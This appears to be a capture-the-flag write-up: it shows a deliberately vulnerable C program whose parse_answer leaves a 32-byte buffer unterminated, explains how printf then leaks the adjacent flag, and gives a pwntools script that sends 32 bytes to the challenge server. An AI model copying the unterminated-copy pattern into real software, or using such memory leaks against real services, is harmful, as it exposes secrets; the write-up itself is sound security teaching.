We have the following source:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char FAVORITE_COLOR[0x20];
char FLAG[0x28];

void parse_answer(char *dst, char *src) {
    int i = 0;
    while (src[i] != '\n') i++;
    memcpy(dst, src, i);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    memset(FAVORITE_COLOR, 0, 0x20);
    char *envFlag = getenv("FLAG");
    if (envFlag) {
        strcpy(FLAG, envFlag);
    } else {
        strcpy(FLAG, "bctf{fake_flag}");
    }

    char buf[0x60];
    printf("What's your favorite color? ");
    fgets(buf, 0x60, stdin);
    parse_answer(FAVORITE_COLOR, buf);

    printf("%s!?!? Mid af color\n", FAVORITE_COLOR);

    return 0;
}
```

I spent quite a time on this challenge, but the solution is quite simple.

Let's break it down clearly: the key idea is that the `printf("%s", FAVORITE_COLOR)` function is being used to print the `FAVORITE_COLOR` buffer, but there's no proper null byte termination due to the way parse_answer works. This allows the buffer to potentially "overflow" into adjacent memory, including the FLAG buffer, and print its contents.

If we just input the exact amount size of `FAVORITE_COLOR` and remove the `null termination` at the end of it, both values of `FLAG` and `FAVORITE_COLOR` will be concated and printed to use.

Exploit code:
```python
from pwn import *

# Start the process
# p = process('./color')  # Replace with your binary
p  = remote('challs.pwnoh.io', 13370)

# Prepare the payload
# Buffer size is 32 (0x20) for FAVORITE_COLOR, overflow happens after 32 bytes
payload = b"A" * 32  # Fill FAVORITE_COLOR completely

# Send the payload to the program
p.sendline(payload)

# Receive the response
p.recvuntil("What's your favorite color? ")

# Since the program will print the contents of FAVORITE_COLOR, this should leak FLAG
response = p.recv()

# Print the leaked flag
print(response)

# Keep the process open for interaction
p.interactive()
```